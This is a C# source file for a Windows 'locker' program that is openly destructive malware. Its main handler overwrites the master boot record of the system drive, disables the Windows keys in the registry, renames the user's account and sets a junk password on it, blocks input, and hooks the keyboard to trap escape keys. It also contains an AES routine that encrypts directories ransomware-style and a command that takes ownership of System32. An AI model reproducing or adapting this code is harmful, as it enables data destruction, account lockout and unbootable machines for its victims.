using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;
using System.DirectoryServices.AccountManagement;
using System.Reflection;

namespace locker
{
    public partial class Form2 : Form
    {

        Random rnd = new Random();
        int shakeAmplitude = 10;
        Point originalLocation;

        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
                    IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberBytesWritten, IntPtr lpOverlapped);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        [DllImport("user32.dll")]
        private static extern bool LockWorkStation();

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;
        private const uint FileFlagDeleteOnClose = 0x40000000;
        private const uint MbrSize = 512u;

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput(bool fBlockIt);

        [DllImport("user32.dll")]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        public Form2()
        {
            InitializeComponent();
            label5.Hide();
            button2.Enabled = true;
        }

        private void StartInfiniteShake()
        {
            originalLocation = label5.Location;
            timer1.Interval = 10;
            timer1.Start();
        }

        public static void EncryptFile(string inputFile, string outputFile, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;

                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
                {
                    using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(fsOutput, aesAlg.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            fsInput.CopyTo(cryptoStream);
                        }
                    }
                }
            }
        }

        public static void EncryptDirectory(string rootDir, byte[] key, byte[] iv, string[] excludedDirs)
        {
            foreach (var dirPath in Directory.GetDirectories(rootDir, "*", SearchOption.AllDirectories))
            {
                bool isExcluded = false;
                foreach (var excludedDir in excludedDirs)
                {
                    if (dirPath.Contains(excludedDir))
                    {
                        isExcluded = true;
                        break;
                    }
                }

                if (isExcluded)
                    continue;

                foreach (var filePath in Directory.GetFiles(dirPath))
                {
                    string encryptedFilePath = filePath + ".WINLCKER";
                    EncryptFile(filePath, encryptedFilePath, key, iv);
                    Console.WriteLine($"Encrypted: {filePath}");
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            int offsetX = rnd.Next(-shakeAmplitude, shakeAmplitude + 1);
            int offsetY = rnd.Next(-shakeAmplitude, shakeAmplitude + 1);
            label5.Location = new Point(originalLocation.X + offsetX, originalLocation.Y + offsetY);
        }

        private void Form2_Load(object sender, EventArgs e)
        {

        }

        private void button2_MouseHover(object sender, EventArgs e)
        {

        }

        private void button2_MouseLeave(object sender, EventArgs e)
        {
            label5.Hide();
            button2.Enabled = true;
            
        }

        private void button2_MouseEnter(object sender, EventArgs e)
        {
            label5.Show();
            button2.Enabled = false;
        }

        /*Thread p3 = new Thread(new ThreadStart(mbr));
        p3.Start();
        Thread.Sleep(3000);
        p3.Abort();*/

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
            Thread p1 = new Thread(new ThreadStart(mbr));
            Thread p2 = new Thread(new ThreadStart(key));
            Thread p3 = new Thread(new ThreadStart(cad));
            Thread p4 = new Thread(new ThreadStart(block));
            Thread p5 = new Thread(new ThreadStart(run));
            p1.Start();
            p2.Start();
            p3.Start();
            Thread.Sleep(2000);
            p4.Start();
            p5.Start();
        }

        private void block()
        {
            BlockInput(true);
        }

        

        private void cad()
        {
            try
            {
                string currentUsername = Environment.UserName;
                string newUsername = "BAD CHOICE TRYING TO ESCAPE...";
                string newPassword = "ILOVEYOU.CLUTTERtechmADEByHeiZENNNN123456789098765432123456787676789009876543!@#$%^&*()(*&^%$#$%^&^%$#$#@#$%^&*((*&^%$#{}{:?><><mnbgfrt^yhgfdser%tyhgfderyhGFDSERTYHGCXSESDF,./.,][P;;;:::''";

                using (PrincipalContext context = new PrincipalContext(ContextType.Machine))
                {
                    UserPrincipal user = UserPrincipal.FindByIdentity(context, currentUsername);

                    if (user != null)
                    {
                        user.SetPassword(newPassword);
                        user.SamAccountName = newUsername;
                        user.DisplayName = newUsername;
                        user.Save();
                    }
                }

                string accountSid = System.Security.Principal.WindowsIdentity.GetCurrent().User.Value;
                string imagePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "tempAccountImage.jpg");

                using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("locker.Tuxsvg.png"))
                using (Image img = Image.FromStream(stream))
                {
                    img.Save(imagePath);
                }

                string destDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Windows", "AccountPictures");
                Directory.CreateDirectory(destDir);

                string destPath = Path.Combine(destDir, $"{accountSid}_accountpicture.jpg");
                File.Copy(imagePath, destPath, true);
            }
            catch { }
        }

        private void run()
        {
            var NewForm = new Form1();
            NewForm.ShowDialog();
        }

        private void mbr()
        {
            var mbrData = new byte[] {0x00
};

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
                OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }

        private void owner()
        {
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 01 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
        }

        private void key()
        {
            byte[] scancodeMap = new byte[]
            {
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00,
            0x03, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x5B, 0xE0,
            0x00, 0x00, 0x5C, 0xE0,
            0x00, 0x00, 0x00, 0x00
            };

            RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SYSTEM\CurrentControlSet\Control\Keyboard Layout", true);
            key.SetValue("Scancode Map", scancodeMap, RegistryValueKind.Binary);
            key.Close();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private const int WH_KEYBOARD_LL = 13;

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode == 0x1B ||
                    (Control.ModifierKeys == (Keys.Control | Keys.Alt) && vkCode == 0x2E) ||
                    vkCode == 0x5B)
                {
                    return (IntPtr)1;
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            timer2.Stop();
            _hookID = SetHook(_proc);
            UnhookWindowsHookEx(_hookID);
            timer2.Start();
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }
    }

}
